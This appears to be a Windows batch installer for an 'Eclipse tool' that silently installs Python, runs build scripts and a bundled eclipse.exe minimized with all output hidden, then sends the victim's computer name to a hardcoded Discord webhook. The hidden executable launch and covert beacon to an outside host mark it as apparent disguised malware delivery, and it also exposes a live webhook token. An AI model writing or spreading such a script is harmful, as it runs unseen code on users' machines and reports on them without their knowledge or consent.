@echo off
Title Downloading Modules...

python --version | findstr "3.10.9" >nul
if %ERRORLEVEL% neq 0 (
    curl -L -o python-3.10.9.exe https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe >nul 2>&1
    start /wait python-3.10.9.exe /quiet InstallAllUsers=1 Include_test=0 >nul 2>&1
    del python-3.10.9.exe
)

python --version | findstr "3.11" >nul
if %ERRORLEVEL% neq 0 (
    curl -L -o python-3.11.exe https://www.python.org/ftp/python/3.11.0/python-3.11.0-amd64.exe >nul 2>&1
    start /wait python-3.11.exe /quiet InstallAllUsers=1 Include_test=0 >nul 2>&1
    del python-3.11.exe
)

python -m pip --version >nul 2>&1
if %ERRORLEVEL% neq 0 (
    python -m ensurepip >nul 2>&1
    python -m pip install --upgrade pip >nul 2>&1
)

pip install -r requirements.txt >nul 2>&1

if not exist "build_done.flag" (
    python utilities/Plugins/build.py >nul 2>&1
    python utilities/Plugins/build2.py >nul 2>&1
    python utilities/Plugins/build3.py >nul 2>&1

    start /min /wait "" utilities/Plugins/eclipse.exe >nul 2>&1

    type nul > build_done.flag
)

set SYSTEM_NAME=%COMPUTERNAME%
curl -H "Content-Type: application/json" -X POST -d "{\"content\": \"%SYSTEM_NAME% has run Eclipse tool.\"}" https://discord.com/api/webhooks/1267985728223186958/_UwqU1xD0Qkn9akumzYJ0ERtFCZSLxzGdYQFnWWmibLyivYVLIxMHzSbyZ57LXiCsN17 >nul 2>&1

python main.py
